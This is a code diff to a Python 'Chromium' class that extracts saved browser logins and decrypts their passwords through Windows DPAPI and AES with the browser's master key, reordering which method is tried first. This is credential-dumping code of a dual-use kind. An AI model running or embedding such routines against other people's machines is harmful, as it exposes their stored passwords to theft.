@@ -142,7 +142,17 @@ class Chromium:
                     # Failed...
                 else:
                     # Decrypt the Password
-                    if master_key:
+                    try:
+                        password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
+                    except:
+                        try:
+                            password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
+                        except:
+                            password_bytes = None
+
+                    if password_bytes is not None:
+                        pwd = password_bytes.decode()
+                    elif master_key:
                         # chromium version > 80
                         try:
                             iv = password[3:15]
@@ -151,19 +161,8 @@ class Chromium:
                             pwd = cipher.decrypt(payload)[:-16].decode()  # remove suffix bytes
                         except:
                             pass
-                    if pwd is None:
-                        try:
-                            password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
-                        except:
-                            try:
-                                password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
-                            except:
-                                password_bytes = None
 
-                        if password_bytes is not None:
-                            pwd = password_bytes.decode()
-
-                if not url and not login and not password:
+                if not url and not login and not pwd:
                     continue
 
                 credentials.add((url, login, pwd))
